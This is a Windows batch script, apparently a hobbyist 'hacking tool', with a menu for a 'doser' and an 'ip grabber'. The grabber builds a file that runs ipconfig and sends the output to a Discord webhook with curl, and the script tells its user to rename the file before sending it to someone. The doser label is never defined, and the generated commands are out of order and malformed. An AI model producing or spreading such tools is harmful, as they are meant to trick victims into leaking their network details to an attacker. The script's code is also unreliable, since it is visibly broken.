@echo off
chcp 65001
title USELESS-ELITE
cls
echo made by USELESS
echo loading system info
ping localhost -n 3 >nul
echo loading color specs
ping localhost -n 2 >nul
echo loading doser function...
ping localhost -n 5 >nul
echo loading Tool......
ping localhost -n 3 >nul
echo loading progress done
pause
cls
color c
echo " .--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--. ";
echo "/ .. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \";
echo "\ \/\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ \/ /";
echo " \/ /`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'\/ / ";
echo " / /\   █    ██      ██████    ▓█████     ██▓       ▓█████      ██████      ██████   / /\ ";
echo "/ /\ \  ██  ▓██▒   ▒██    ▒    ▓█   ▀    ▓██▒       ▓█   ▀    ▒██    ▒    ▒██    ▒  / /\ \";
echo "\ \/ / ▓██  ▒██░   ░ ▓██▄      ▒███      ▒██░       ▒███      ░ ▓██▄      ░ ▓██▄    \ \/ /";
echo " \/ /  ▓▓█  ░██░     ▒   ██▒   ▒▓█  ▄    ▒██░       ▒▓█  ▄      ▒   ██▒     ▒   ██▒  \/ / ";
echo " / /\  ▒▒█████▓    ▒██████▒▒   ░▒████▒   ░██████▒   ░▒████▒   ▒██████▒▒   ▒██████▒▒  / /\ ";
echo "/ /\ \ ░▒▓▒ ▒ ▒    ▒ ▒▓▒ ▒ ░   ░░ ▒░ ░   ░ ▒░▓  ░   ░░ ▒░ ░   ▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░ / /\ \";
echo "\ \/ / ░░▒░ ░ ░    ░ ░▒  ░ ░    ░ ░  ░   ░ ░ ▒  ░    ░ ░  ░   ░ ░▒  ░ ░   ░ ░▒  ░ ░ \ \/ /";
echo " \/ /   ░░░ ░ ░    ░  ░  ░        ░        ░ ░         ░      ░  ░  ░     ░  ░  ░    \/ / ";
echo " / /\     ░              ░        ░  ░       ░  ░      ░  ░         ░           ░    / /\ ";
echo "/ /\ \                                                                              / /\ \";
echo "\ \/ /    ▓█████     ██▓        ██▓   ▄▄▄█████▓   ▓█████                            \ \/ /";
echo " \/ /     ▓█   ▀    ▓██▒       ▓██▒   ▓  ██▒ ▓▒   ▓█   ▀                             \/ / ";
echo " / /\     ▒███      ▒██░       ▒██▒   ▒ ▓██░ ▒░   ▒███                               / /\ ";
echo "/ /\ \    ▒▓█  ▄    ▒██░       ░██░   ░ ▓██▓ ░    ▒▓█  ▄                            / /\ \";
echo "\ \/ /    ░▒████▒   ░██████▒   ░██░     ▒██▒ ░    ░▒████▒                           \ \/ /";
echo " \/ /     ░░ ▒░ ░   ░ ▒░▓  ░   ░▓       ▒ ░░      ░░ ▒░ ░                            \/ / ";
echo " / /\      ░ ░  ░   ░ ░ ▒  ░    ▒ ░       ░        ░ ░  ░                            / /\ ";
echo "/ /\ \       ░        ░ ░       ▒ ░     ░            ░                              / /\ \";
echo "\ \/ /       ░  ░       ░  ░    ░                    ░  ░                           \ \/ /";
echo " \/ /                                                                                \/ / ";
echo " / /\.--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--./ /\ ";
echo "/ /\ \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \/\ \";
echo "\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `' /";
echo " `--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--' ";
:main
echo            ╔═══════════════════════╗
echo            ║1) doser               ║
echo            ║2) ip grabber          ║
echo            ╚═══════════════════════╝
set /p choice= OPT=
if %choice%==1 goto DDOS
if %choice%==2 goto grabber
:grabber
set /p "webhook=enter your discord webhook:

if "%webhook%"=="" (
	echo discord webhook is required
	goto main
)

echo connection (true) making ip logger script
timeout /t 5 >nul

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output / dev/null -F 1-@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo ip grabber script has been downloaded please go to your files to find it saved at ip_grabber_exec.bat make sure to rename it before you send it to anyone
pause
cls
goto main